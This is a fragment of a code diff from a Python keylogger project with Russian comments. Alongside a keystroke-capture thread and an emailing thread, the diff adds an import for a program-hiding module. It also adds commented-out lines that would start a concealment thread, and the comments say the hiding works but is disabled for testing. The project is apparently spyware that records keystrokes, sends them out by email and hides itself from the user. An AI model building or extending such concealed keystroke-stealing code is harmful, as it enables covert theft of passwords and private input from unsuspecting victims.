@@ -4,6 +4,7 @@ from pynput import keyboard
 import ctypes
 from sending_to_email import *
 import threading
+from hide_programm import *
 
 # СЛОВАРИ
 # издевательство, перевод с англ раскладки на РУ
@@ -161,14 +162,17 @@ if __name__ == '__main__':
     # потоки
     keylogger_thread = threading.Thread(target=start_keylogger)
     main_email_thread = threading.Thread(target=main)
+    # hide_prog_thread = threading.Thread(target=hide_prog)  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
     # старт потоков
     keylogger_thread.start()
     main_email_thread.start()
+    # hide_prog_thread.start()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
     # ожидание завершение др потока
     keylogger_thread.join()
     main_email_thread.join()
+    # hide_prog_thread.join()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
 
 
